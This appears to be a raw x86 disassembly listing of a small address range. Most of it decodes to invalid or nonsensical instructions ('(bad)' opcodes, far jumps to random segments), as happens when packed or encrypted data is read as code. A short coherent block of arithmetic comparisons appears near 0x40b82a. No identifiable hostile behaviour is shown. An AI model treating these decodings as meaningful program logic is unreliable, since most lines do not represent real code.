  40b394:	sahf   
  40b395:	out    0xcb,eax
  40b397:	fiadd  WORD PTR [ebp+0x2c]
  40b39a:	inc    esp
  40b39b:	lods   eax,DWORD PTR ds:[esi]
  40b39c:	rol    dh,cl
  40b39e:	dec    ecx
  40b39f:	sub    al,0x4
  40b3a1:	aam    0x66
  40b3a3:	sbb    ecx,DWORD PTR [esi+0x458ef5a6]
  40b3a9:	and    edi,DWORD PTR [ecx]
  40b3ab:	into   
  40b3ac:	push   0xfffffff3
  40b3ae:	push   eax
  40b3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b0:	bound  eax,QWORD PTR [esi]
  40b3b2:	outs   dx,DWORD PTR ds:[esi]
  40b3b3:	and    eax,0xfca3133d
  40b3b8:	mov    edi,0xcf5aa357
  40b3bd:	aam    0x44
  40b3bf:	mov    eax,0x5fb50f17
  40b3c4:	push   ecx
  40b3c5:	xor    esp,esp
  40b3c7:	daa    
  40b3c8:	xchg   ebp,eax
  40b3c9:	adc    ch,BYTE PTR [esp+edi*4]
  40b3cc:	outs   dx,BYTE PTR ds:[esi]
  40b3cd:	pop    edx
  40b3ce:	inc    ebp
  40b3d0:	call   0x538:0x5096dac3
  40b3d7:	sbb    DWORD PTR [esi-0x36],edx
  40b3da:	and    DWORD PTR [bx+si-0x80],0xffffffaf
  40b3df:	inc    ecx
  40b3e0:	add    al,0x5c
  40b3e2:	xchg   edi,eax
  40b3e3:	ror    BYTE PTR [ebp+0x47],0x1c
  40b3e7:	loopne 0x40b44e
  40b3e9:	mov    cl,0x11
  40b3eb:	(bad)  
  40b3ec:	mov    ebx,0x8d1e5c58
  40b3f1:	push   ecx
  40b3f2:	jne    0x40b379
  40b3f4:	test   DWORD PTR [edx-0x7c],ebp
  40b3f7:	jbe    0x40b42f
  40b3f9:	loop   0x40b43f
  40b3fb:	xchg   ebx,eax
  40b3fc:	daa    
  40b3fd:	add    al,0x20
  40b3ff:	pop    ds
  40b400:	in     al,0x2b
  40b402:	fistp  QWORD PTR [ebx]
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x11
  40b425:	call   0x7e7e:0x86e8f7c1
  40b42c:	jo     0x40b4a7
  40b42e:	jle    0x40b4ae
  40b430:	mov    ebp,0x94eef1e2
  40b435:	pop    ebp
  40b436:	loop   0x40b44f
  40b438:	add    bh,BYTE PTR [eax+0x3c]
  40b43b:	adc    dh,cl
  40b43d:	pushf  
  40b43e:	imul   ecx,edx,0xc8866e49
  40b444:	mov    bl,0xb1
  40b446:	dec    eax
  40b447:	paddb  mm7,QWORD PTR [eax+0x54]
  40b44b:	push   cs
  40b44c:	bound  edi,QWORD PTR [edi+0x78769b33]
  40b452:	push   ds
  40b453:	mov    BYTE PTR [ecx],dl
  40b455:	frstor [edi-0x60ad5a87]
  40b45b:	test   esi,0x5e633a2a
  40b461:	mov    edi,0xb1c44c25
  40b466:	mov    ds:0x28741920,eax
  40b46b:	mov    al,ds:0xaa8d2855
  40b470:	nop
  40b471:	loope  0x40b436
  40b473:	rcl    DWORD PTR [eax],0xec
  40b476:	mov    ds:0xb2991a2f,eax
  40b47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b47c:	pop    es
  40b47d:	test   eax,0xe5e744fd
  40b482:	and    dl,dh
  40b484:	arpl   cx,dx
  40b486:	or     ah,al
  40b488:	mov    eax,ds:0x8c157717
  40b48d:	add    al,0x32
  40b48f:	(bad)  
  40b490:	mov    ebx,0x62c4d304
  40b495:	cdq    
  40b496:	dec    edi
  40b497:	adc    dl,BYTE PTR [ecx]
  40b499:	cmp    dh,0x8c
  40b49c:	mov    BYTE PTR [ecx-0x43],ah
  40b49f:	std    
  40b4a0:	or     BYTE PTR [edx+0x34],0xaf
  40b4a4:	cmp    eax,0xd0b3238b
  40b4a9:	add    eax,0xff10af99
  40b4ae:	outs   dx,BYTE PTR cs:[esi]
  40b4b0:	mov    dh,0xf5
  40b4b2:	xchg   esp,eax
  40b4b3:	mov    edi,DWORD PTR [ecx+0x27]
  40b4b6:	lock add dl,dl
  40b4b9:	push   edi
  40b4ba:	ret    0xf844
  40b4bd:	in     eax,0x98
  40b4bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c0:	mov    dl,0xfa
  40b4c2:	in     eax,0x92
  40b4c4:	push   ebx
  40b4c5:	call   0x1d9dcae3
  40b4ca:	es push 0xff8ba8b1
  40b4d0:	mov    esp,edx
  40b4d2:	pop    ss
  40b4d3:	inc    esi
  40b4d4:	ja     0x40b458
  40b4d6:	cmp    BYTE PTR [esi],0x7e
  40b4d9:	pop    esp
  40b4da:	sbb    eax,0xeeff35e2
  40b4df:	aaa    
  40b4e0:	push   0xfffffff6
  40b4e2:	adc    ecx,DWORD PTR [edx+ecx*2-0x62d9706d]
  40b4e9:	std    
  40b4ea:	mov    esp,0xb522dd2c
  40b4ef:	je     0x40b4cf
  40b4f1:	xor    eax,0x7f6ff837
  40b4f6:	pop    esp
  40b4f7:	into   
  40b4f8:	dec    ebp
  40b4f9:	mov    eax,0x76a4b24c
  40b4fe:	dec    ebp
  40b4ff:	sti    
  40b500:	fdiv   DWORD PTR [edi]
  40b502:	inc    eax
  40b503:	ds push ebp
  40b505:	jle    0x40b525
  40b507:	xor    cl,BYTE PTR ss:[edx]
  40b50a:	and    al,0xd0
  40b50c:	jle    0x40b50d
  40b50e:	popa   
  40b50f:	daa    
  40b510:	cmp    DWORD PTR [edi+edi*8],edx
  40b513:	sbb    eax,0xf5e3869d
  40b518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b519:	lea    edi,ds:0xb56b758
  40b51f:	ja     0x40b4cd
  40b521:	push   ss
  40b522:	inc    ecx
  40b523:	xchg   ebp,eax
  40b524:	or     dl,BYTE PTR [eax+0x5b]
  40b527:	mov    esp,0x35913930
  40b52c:	mov    ecx,0x7da34878
  40b531:	cmp    BYTE PTR [edi],cl
  40b533:	adc    dl,BYTE PTR ds:0x97ba2fc
  40b539:	inc    ecx
  40b53a:	cmp    esp,DWORD PTR [esi-0x78]
  40b53d:	sbb    DWORD PTR [edx],esi
  40b53f:	clc    
  40b540:	ret    0xc0e0
  40b543:	mov    al,ds:0x9eb13f2f
  40b548:	es push edx
  40b54a:	cs mov edi,0xc367970d
  40b550:	pusha  
  40b551:	imul   eax,DWORD PTR [edx-0x30e19b4a],0x51
  40b558:	and    edx,DWORD PTR [edi+0x15]
  40b55b:	setb   BYTE PTR [esi+0x13]
  40b55f:	test   al,0x4e
  40b561:	dec    ebx
  40b562:	push   esp
  40b563:	push   esp
  40b564:	push   ebp
  40b565:	retf   
  40b566:	cmp    eax,0x5bcd45eb
  40b56b:	inc    edx
  40b56c:	pop    ebx
  40b56d:	pop    ecx
  40b56e:	fwait
  40b56f:	imul   esp,DWORD PTR [ebx-0x39236a9d],0x36a0aa10
  40b579:	jne    0x40b55e
  40b57b:	cmp    ch,BYTE PTR [eax+0x3024ea09]
  40b581:	pop    edx
  40b582:	mov    ebp,0x30f6b09f
  40b587:	mov    esi,0x75f710e0
  40b58c:	ror    DWORD PTR [esi],1
  40b58e:	stos   BYTE PTR es:[edi],al
  40b58f:	push   esi
  40b590:	xchg   ecx,eax
  40b591:	clc    
  40b592:	imul   esi,DWORD PTR [ecx-0x66],0x3f4c4f4f
  40b599:	sub    eax,0x18c1e174
  40b59e:	fimul  WORD PTR [esi]
  40b5a0:	adc    eax,ebx
  40b5a2:	stc    
  40b5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a4:	loop   0x40b594
  40b5a6:	push   edx
  40b5a7:	sbb    al,0x29
  40b5a9:	ins    BYTE PTR es:[edi],dx
  40b5aa:	loop   0x40b61e
  40b5ac:	sub    BYTE PTR ds:0x74215f28,bl
  40b5b2:	fs ins DWORD PTR es:[edi],dx
  40b5b4:	out    dx,al
  40b5b5:	add    BYTE PTR [eax-0x62],dh
  40b5b8:	enter  0x3fa6,0xc
  40b5bc:	sub    BYTE PTR [eax-0x9],cl
  40b5bf:	pusha  
  40b5c0:	sbb    ecx,esi
  40b5c2:	or     esp,esp
  40b5c4:	(bad)  
  40b5c5:	xor    bl,BYTE PTR [ecx+0x79d80f64]
  40b5cb:	push   ss
  40b5cc:	mov    BYTE PTR [eax+esi*1-0x5cdf76df],bl
  40b5d3:	sbb    BYTE PTR [edx],al
  40b5d5:	outs   dx,BYTE PTR ds:[esi]
  40b5d6:	dec    ebp
  40b5d7:	sub    al,0xd8
  40b5d9:	in     eax,dx
  40b5da:	cli    
  40b5db:	out    0x84,eax
  40b5dd:	addr16 push eax
  40b5df:	lods   eax,DWORD PTR ds:[esi]
  40b5e0:	pop    ebp
  40b5e1:	push   0x19
  40b5e3:	loop   0x40b59d
  40b5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e6:	in     eax,dx
  40b5e7:	lods   al,BYTE PTR ds:[esi]
  40b5e8:	sbb    bl,BYTE PTR [eax+0x5647fc5]
  40b5ee:	lods   eax,DWORD PTR ds:[esi]
  40b5ef:	scas   eax,DWORD PTR es:[edi]
  40b5f0:	pop    esp
  40b5f1:	retf   0xb98f
  40b5f4:	push   es
  40b5f5:	das    
  40b5f6:	cs (bad) 
  40b5f8:	mov    ecx,0xeb391d52
  40b5fd:	scas   eax,DWORD PTR es:[edi]
  40b5fe:	dec    edi
  40b5ff:	rcl    al,0x7b
  40b602:	jb     0x40b5c1
  40b604:	inc    esi
  40b605:	icebp  
  40b606:	dec    esi
  40b607:	pop    DWORD PTR [ebx]
  40b609:	test   BYTE PTR [ebx-0x73dd5621],bh
  40b60f:	mov    eax,0x8093823f
  40b614:	mul    BYTE PTR [edx-0x5a]
  40b617:	cmp    al,0x64
  40b619:	cmp    al,0x2e
  40b61b:	test   DWORD PTR [edi+0x30],ebx
  40b61e:	cld    
  40b61f:	mov    bh,0x4f
  40b621:	add    eax,0x1e8fb592
  40b626:	hlt    
  40b627:	(bad)  
  40b628:	ret    
  40b629:	push   cs
  40b62a:	cld    
  40b62b:	daa    
  40b62c:	adc    dl,BYTE PTR [eax+ebp*8]
  40b62f:	jl     0x40b5c9
  40b631:	lods   al,BYTE PTR ds:[esi]
  40b632:	inc    esp
  40b633:	xchg   ebp,eax
  40b634:	loop   0x40b5de
  40b636:	shr    BYTE PTR [ebp+0x73],1
  40b639:	lods   eax,DWORD PTR ds:[esi]
  40b63a:	inc    esp
  40b63b:	and    eax,0xa469fb1d
  40b640:	sbb    eax,0xa519761f
  40b645:	jae    0x40b5cc
  40b647:	das    
  40b648:	add    DWORD PTR [ecx],edi
  40b64a:	mov    al,ds:0xbf844824
  40b64f:	les    ebp,FWORD PTR [esi]
  40b651:	xchg   edx,eax
  40b652:	(bad)
  40b655:	xor    al,0xf3
  40b657:	fs push es
  40b659:	pop    edi
  40b65b:	punpckhdq mm5,QWORD PTR [edx]
  40b65e:	cmp    dl,ch
  40b660:	test   al,0x46
  40b662:	jmp    FWORD PTR [eax-0x53]
  40b665:	pop    es
  40b666:	lea    esi,[edx+0x4c7959f]
  40b66c:	(bad)  
  40b66e:	pushf  
  40b66f:	stc    
  40b670:	cmp    edx,0xffffffdd
  40b673:	xchg   ebx,eax
  40b674:	shr    bh,cl
  40b676:	leave  
  40b677:	inc    edx
  40b678:	loop   0x40b667
  40b67a:	or     al,0x6d
  40b67c:	idiv   bh
  40b67e:	or     eax,0xa6aa5f9c
  40b683:	ret    
  40b684:	pop    eax
  40b685:	or     eax,0x5c5c488c
  40b68a:	sub    al,0xbf
  40b68c:	sub    DWORD PTR [ebx-0x3d],edi
  40b68f:	popf   
  40b690:	jl     0x40b61d
  40b692:	sar    dx,1
  40b695:	retf   0x880e
  40b698:	pop    edi
  40b699:	mov    al,0x32
  40b69b:	iret   
  40b69c:	aas    
  40b69d:	inc    ebx
  40b69e:	push   ebp
  40b69f:	pop    edx
  40b6a0:	mov    al,ds:0x2a3584c6
  40b6a5:	sub    edi,DWORD PTR [eax-0x80]
  40b6a8:	mov    dl,0xd6
  40b6aa:	sub    DWORD PTR [edi],edi
  40b6ac:	mov    ecx,0x8be99f2b
  40b6b1:	or     ebp,DWORD PTR [edi+0x2a]
  40b6b4:	sub    cl,BYTE PTR [ebp-0x5799cf1f]
  40b6ba:	add    DWORD PTR [eax],0x8ecaad1b
  40b6c0:	pop    eax
  40b6c1:	sti    
  40b6c2:	xor    BYTE PTR [ecx],dh
  40b6c4:	push   0x3e42bef
  40b6c9:	push   edi
  40b6ca:	jmp    0x13ab:0xbf26c134
  40b6d1:	add    cl,BYTE PTR [ebx-0x42424258]
  40b6d7:	(bad)  [edx-0x6669b29a]
  40b6dd:	repnz ss hlt 
  40b6e0:	vpmacswd ymm7,ymm1,ymm7,ymm1
  40b6e6:	dec    eax
  40b6e7:	(bad)  
  40b6e8:	push   esp
  40b6e9:	dec    ebp
  40b6ea:	cmp    edx,DWORD PTR [ecx-0x784bb54]
  40b6f0:	xor    al,0xe
  40b6f2:	cmp    bh,BYTE PTR [eax]
  40b6f4:	xor    al,0x8
  40b6f6:	(bad)  
  40b6f7:	jmp    0x174b:0x350e3a79
  40b6fe:	icebp  
  40b6ff:	pop    ebp
  40b700:	mov    ds:0xd35cdcee,eax
  40b705:	dec    ecx
  40b706:	in     eax,0xe9
  40b708:	cmp    al,0x1e
  40b70a:	mov    edi,0x8bfea03
  40b70f:	push   ds
  40b710:	js     0x40b6ca
  40b712:	cld    
  40b713:	loopne 0x40b74a
  40b715:	bnd jns 0x40b754
  40b718:	fdivr  QWORD PTR [ecx]
  40b71a:	xchg   edi,eax
  40b71b:	inc    ebp
  40b71c:	jmp    0x40b6ef
  40b71e:	or     DWORD PTR [edi+0x61],0xffffff94
  40b722:	in     al,dx
  40b723:	jmp    0x1e19:0xe5b9c20b
  40b72a:	cmp    DWORD PTR [edx+ebp*1],0xffffff86
  40b72e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b72f:	das    
  40b730:	or     BYTE PTR [eax-0x231bebc9],cl
  40b736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b737:	and    DWORD PTR [esi+0x5c528278],edx
  40b73d:	mov    al,ds:0x74221511
  40b742:	add    dl,bl
  40b744:	add    eax,0x882d031b
  40b749:	js     0x40b707
  40b74b:	sbb    DWORD PTR [edi+edx*1+0x70],ecx
  40b74f:	jp     0x40b791
  40b751:	pop    ebx
  40b752:	mov    al,ds:0x2ba12849
  40b757:	lea    ecx,[edx-0x8f09baf]
  40b75d:	and    bl,BYTE PTR ds:0x9432cb9
  40b763:	xchg   esp,eax
  40b764:	mov    esp,0x7f951012
  40b769:	mov    ah,0x48
  40b76b:	aad    0x97
  40b76d:	les    ebx,FWORD PTR [eax+ebp*4+0x71]
  40b771:	mov    al,ds:0x62927991
  40b776:	(bad)  
  40b777:	xor    al,BYTE PTR [edi+edi*2]
  40b77a:	clc    
  40b77b:	and    dl,dh
  40b77d:	push   cs
  40b77e:	mov    al,ds:0x6a4b3265
  40b783:	mov    eax,ds:0x58d3adb1
  40b788:	mov    al,0x20
  40b78a:	inc    esi
  40b78b:	cmc    
  40b78c:	jae    0x40b803
  40b78e:	daa    
  40b78f:	jp     0x40b7eb
  40b791:	stc    
  40b792:	sub    DWORD PTR [edx+0x75],esi
  40b795:	pop    edx
  40b796:	xor    DWORD PTR [ebx+0x4e],esi
  40b799:	(bad)  
  40b79a:	push   esp
  40b79b:	add    eax,0x5e0a8bc6
  40b7a0:	dec    ebp
  40b7a1:	and    bl,BYTE PTR [eax+ecx*1+0x3d]
  40b7a5:	pop    edx
  40b7a6:	xor    cl,cl
  40b7a8:	mov    ds:0x747dd9c6,al
  40b7ad:	test   al,0x9d
  40b7af:	sbb    al,0x6a
  40b7b1:	pushf  
  40b7b2:	adc    DWORD PTR [ecx],0x69
  40b7b5:	adc    al,0xac
  40b7b7:	lahf   
  40b7b8:	mov    BYTE PTR [esi-0x155f0929],bl
  40b7be:	fld    DWORD PTR [eax+0x5341b3fb]
  40b7c4:	sbb    DWORD PTR [edx-0x46588e46],ebp
  40b7ca:	cmp    ch,BYTE PTR [ecx-0x6f]
  40b7cd:	fwait
  40b7ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7cf:	xchg   edx,eax
  40b7d0:	mov    al,0x6b
  40b7d2:	add    bl,BYTE PTR [ebx-0x1232d6d8]
  40b7d8:	ss clc 
  40b7da:	es jge 0x40b848
  40b7dd:	jb     0x40b7bb
  40b7df:	mov    edx,0x5dd0ef9f
  40b7e4:	cmp    bh,BYTE PTR [edx+0x37]
  40b7e7:	sbb    dh,BYTE PTR [edi+0x2a4ac02c]
  40b7ed:	jo     0x40b7c4
  40b7ef:	in     al,0xd3
  40b7f1:	test   BYTE PTR [ecx],bh
  40b7f3:	scas   al,BYTE PTR es:[edi]
  40b7f4:	mov    edx,0xf6915418
  40b7f9:	out    0x77,eax
  40b7fb:	jb     0x40b7cd
  40b7fd:	gs faddp st(5),st
  40b800:	fisubr WORD PTR [esi+0x61884485]
  40b806:	iret   
  40b807:	in     al,0x53
  40b809:	sbb    ebx,DWORD PTR [ecx-0x32]
  40b80c:	pop    eax
  40b80d:	sbb    BYTE PTR [edi-0x7b6409f8],bh
  40b813:	bound  edx,QWORD PTR [eax+0x8046077]
  40b819:	jl     0x40b895
  40b81b:	cs rcl esi,1
  40b81e:	adc    dl,BYTE PTR [edi]
  40b820:	xchg   edi,eax
  40b821:	xor    al,dh
  40b823:	dec    eax
  40b824:	les    ecx,FWORD PTR [edi+0x5f]
  40b827:	out    dx,al
  40b828:	js     0x40b7b7
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	lahf   
  40b8a5:	(bad)  
  40b8a7:	sbb    esp,edx
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b914
  40b8b1:	mov    ds:0xc510600d,al
  40b8b6:	jns    0x40b8c9
  40b8b8:	pop    esp
  40b8b9:	adc    eax,0x40c8dc6e
  40b8be:	xchg   edi,eax
  40b8bf:	loopne 0x40b91d
  40b8c1:	pop    ss
  40b8c2:	cmp    ch,BYTE PTR [ecx-0x6e5e8668]
  40b8c8:	xor    eax,0x48b6f466
  40b8cd:	out    0xe3,eax
  40b8cf:	jecxz  0x40b89b
  40b8d1:	aam    0x25
  40b8d3:	or     DWORD PTR [eax-0x29],ecx
  40b8d6:	scas   eax,DWORD PTR es:[edi]
  40b8d7:	cmp    al,0x50
  40b8d9:	pop    ebx
  40b8da:	mov    esp,0xc42b68a9
  40b8df:	addr16 jbe 0x40b8bb
  40b8e2:	push   edi
  40b8e3:	jb     0x40b95e
  40b8e5:	mov    edx,0xde6ad7d5
  40b8ea:	mov    ds:0x84eedd9a,eax
  40b8ef:	jb     0x40b92f
  40b8f1:	push   0x630b2407
  40b8f6:	xchg   ebx,eax
  40b8f7:	xor    ecx,edx
  40b8f9:	icebp  
  40b8fa:	pop    edi
  40b8fb:	sti    
  40b8fc:	repz xchg esp,eax
  40b8fe:	out    0x9c,al
  40b900:	hlt    
  40b901:	fiadd  DWORD PTR [ecx+0x3e6de0fd]
  40b907:	cmp    BYTE PTR [edi],al
  40b909:	cmp    eax,ebp
  40b90b:	push   edx
  40b90c:	popf   
  40b90d:	jmp    0x610f:0x65369a7f
  40b914:	ret    0x91dc
  40b917:	scas   al,BYTE PTR es:[edi]
  40b918:	xchg   edx,eax
  40b919:	cmp    al,0xa1
  40b91b:	int    0x3b
  40b91d:	daa    
  40b91e:	lock ins BYTE PTR es:[edi],dx
  40b920:	repnz or dl,bl
  40b923:	inc    esi
  40b924:	aas    
  40b925:	je     0x40b8ca
  40b927:	jmp    0x5fe162a8
  40b92c:	push   esi
  40b92d:	pop    ebp
  40b92e:	jle    0x40b8de
  40b930:	sub    edi,DWORD PTR [edx+0x3a]
  40b933:	outs   dx,DWORD PTR ds:[esi]
  40b934:	adc    BYTE PTR [edi-0x3173f5e9],al
  40b93a:	in     al,dx
  40b93b:	sbb    al,0xc8
  40b93d:	into   
  40b93e:	jno    0x40b90f
  40b940:	scas   eax,DWORD PTR es:[edi]
  40b941:	outs   dx,DWORD PTR ds:[esi]
  40b942:	repz or eax,0x86483345
  40b948:	push   0xc4d48d09
  40b94d:	test   al,0xc
  40b94f:	mul    ebx
  40b951:	mov    eax,0xa022d6b1
  40b956:	jnp    0x40b9b5
  40b958:	xchg   ebx,eax
  40b959:	ja     0x40b9c9
  40b95b:	in     al,0xc1
  40b95d:	xor    DWORD PTR [eax-0x61e2a12d],esp
  40b963:	shl    BYTE PTR [esi+esi*4+0x39],0x69
  40b968:	and    bh,BYTE PTR [ebp+0x366a348]
  40b96e:	nop
  40b96f:	das    
  40b970:	jno    0x40b932
  40b972:	push   eax
  40b973:	jp     0x40b98a
  40b975:	or     BYTE PTR [esp+esi*8-0x4ac6286d],dl
  40b97c:	add    eax,0x3ca5fba6
  40b981:	or     edi,DWORD PTR [ebp-0x8b2e13f]
  40b987:	adc    DWORD PTR [edx-0x19ab77f1],ecx
  40b98d:	popf   
  40b98e:	cmp    al,BYTE PTR [ebx-0x4d7225de]
  40b994:	(bad)  
  40b995:	pop    eax
  40b996:	mov    ebx,0xa87ead9e
  40b99b:	and    DWORD PTR [eax-0x21ee4747],0x20
  40b9a2:	bound  ebp,QWORD PTR [edi]
  40b9a4:	lods   eax,DWORD PTR ds:[esi]
  40b9a5:	test   BYTE PTR [edi],dh
  40b9a7:	dec    ebp
  40b9a8:	outs   dx,BYTE PTR ds:[esi]
  40b9a9:	retf   0x41bc
  40b9ac:	push   0x41e19a50
  40b9b1:	into   
  40b9b2:	gs push ecx
  40b9b4:	sbb    ebx,ebx
  40b9b6:	dec    edx
  40b9b7:	inc    edx
  40b9b8:	(bad)  
  40b9b9:	pop    esp
  40b9ba:	xor    dl,BYTE PTR [edi+edx*2]
  40b9bd:	cs jns 0x40b946
  40b9c0:	or     BYTE PTR [ebp+0x64],dh
  40b9c3:	push   es
  40b9c4:	cwde   
  40b9c5:	aaa    
  40b9c6:	or     BYTE PTR [edi-0x7ddbc9e4],0xa3
  40b9cd:	(bad)  
  40b9ce:	fld    TBYTE PTR [edx]
  40b9d0:	mov    ds:0x6dcd44a5,eax
  40b9d5:	jl     0x40b9a5
  40b9d7:	push   ebx
  40b9d8:	in     al,0xe3
  40b9da:	mov    esp,0x399bec81
  40b9df:	add    edi,ebp
  40b9e1:	fscale 
  40b9e3:	push   0xffffffa7
  40b9e5:	mov    ds:0x1b8a5f8,eax
  40b9ea:	or     DWORD PTR [eax+esi*2+0x7e],ecx
  40b9ee:	jae    0x40b9b9
  40b9f0:	sub    ah,BYTE PTR [edi+ebx*2-0x30eb9db]
  40b9f7:	adc    ecx,DWORD PTR [esi+edx*1-0x4d]
  40b9fb:	stos   DWORD PTR es:[edi],eax
  40b9fc:	mov    edi,0x49295718
  40ba01:	(bad)  
  40ba02:	sub    DWORD PTR [ebx],esi
  40ba04:	mov    ds:0x5f14ecb7,eax
  40ba09:	enter  0x564b,0x9b
  40ba0d:	mov    WORD PTR [ecx+0x1],?
  40ba10:	jo     0x40ba91
  40ba12:	mov    BYTE PTR ss:[edi],dh
  40ba15:	rol    BYTE PTR [esi+0x40],1
  40ba18:	(bad)  
  40ba19:	dec    esp
  40ba1a:	adc    ebx,edi
  40ba1c:	test   DWORD PTR [edi+0x5e946416],ebx
  40ba22:	push   esi
  40ba23:	adc    DWORD PTR [esi],ebx
  40ba25:	ja     0x40ba7e
  40ba27:	popa   
  40ba28:	cld    
  40ba29:	shl    DWORD PTR [ebx+0x74],cl
  40ba2c:	jle    0x40ba5a
  40ba2e:	pop    edi
  40ba2f:	xor    BYTE PTR [ebp-0x487869e6],ah
  40ba35:	imul   ecx,DWORD PTR [eax],0x29
  40ba38:	out    0x68,eax
  40ba3a:	jno    0x40baad
  40ba3c:	ds cld 
  40ba3e:	retf   0x56ae
  40ba41:	inc    esi
  40ba42:	lods   al,BYTE PTR ds:[esi]
  40ba43:	adc    eax,DWORD PTR [esi]
  40ba45:	sar    BYTE PTR [ebx+0x406d7551],1
  40ba4b:	les    esi,FWORD PTR [ebx+ebp*1-0xf8711a9]
  40ba52:	jmp    0xfa74:0x5298ff1a
  40ba59:	sub    DWORD PTR [edi-0x13656b90],esi
  40ba5f:	jo     0x40b9f7
  40ba61:	jnp    0x40baab
  40ba63:	(bad)  
  40ba64:	fidivr DWORD PTR [ecx-0x11fff413]
  40ba6a:	pop    ebp
  40ba6b:	aad    0x5b
  40ba6d:	iret   
  40ba6e:	loop   0x40ba40
  40ba70:	jb     0x40ba95
  40ba72:	popf   
  40ba73:	mov    cl,0x2d
  40ba75:	fisub  DWORD PTR [ecx-0x67e93271]
  40ba7b:	js     0x40b9fd
  40ba7d:	cmc    
  40ba7e:	dec    edi
  40ba7f:	push   esi
  40ba80:	sbb    bl,BYTE PTR [ebx]
  40ba82:	rol    DWORD PTR [ecx],0xe6
  40ba85:	iret   
  40ba86:	pop    ebp
  40ba87:	ds shr bl,1
  40ba8a:	clc    
  40ba8b:	mov    ecx,0x57634842
  40ba90:	inc    edi
  40ba91:	xchg   DWORD PTR [ecx],esp
  40ba93:	push   ebp
  40ba94:	sbb    BYTE PTR [eax+0x20134ae],ch
  40ba9a:	gs fwait
  40ba9c:	fs (bad) 
  40ba9e:	cmp    ebx,ebp
  40baa0:	daa    
  40baa1:	jl     0x40bada
  40baa3:	cmp    DWORD PTR [edx+0x1687187d],ecx
  40baa9:	push   0xb78beb30
  40baae:	push   edx
  40baaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab1:	(bad)  
  40bab2:	mov    WORD PTR [eax],cs
  40bab4:	nop
  40bab5:	push   ds
  40bab6:	jge    0x40baf8
  40bab8:	cwde   
  40bab9:	in     eax,0xb7
  40babb:	sub    DWORD PTR [ebx-0x60],eax
  40babe:	mov    ebp,DWORD PTR [ebp-0x21b130ae]
  40bac4:	daa    
  40bac5:	aad    0x85
  40bac7:	jmp    0x62158b20
  40bacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bacd:	inc    eax
  40bace:	xchg   ebx,eax
  40bacf:	rcr    BYTE PTR [ebp+0x4c],1
  40bad2:	test   BYTE PTR [esi],dl
  40bad4:	pop    es
  40bad5:	pop    es
  40bad6:	enter  0xa136,0x30
  40bada:	mov    cl,0x19
  40badc:	call   0xe955:0xa1aef53c
  40bae3:	xor    BYTE PTR [ecx],0xd6
  40bae6:	pop    edi
  40bae7:	ret    0xa9c8
  40baea:	rep outs dx,BYTE PTR ds:[esi]
  40baec:	mov    ecx,0xdafdfecf
  40baf1:	mov    ds:0x6c4ae0a0,al
  40baf6:	adc    bh,BYTE PTR [eax]
  40baf8:	nop
  40baf9:	data16 sub bl,BYTE PTR [edx-0x68d9f58a]
  40bb00:	mov    dh,0x78
  40bb02:	mov    edi,0x162719bd
  40bb07:	adc    dh,BYTE PTR ds:0x58749a43
  40bb0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb0e:	or     esp,DWORD PTR [eax-0x15f1622e]
  40bb14:	in     eax,0xb2
  40bb16:	ret    0xcedd
  40bb19:	aad    0x1f
  40bb1b:	loop   0x40bb97
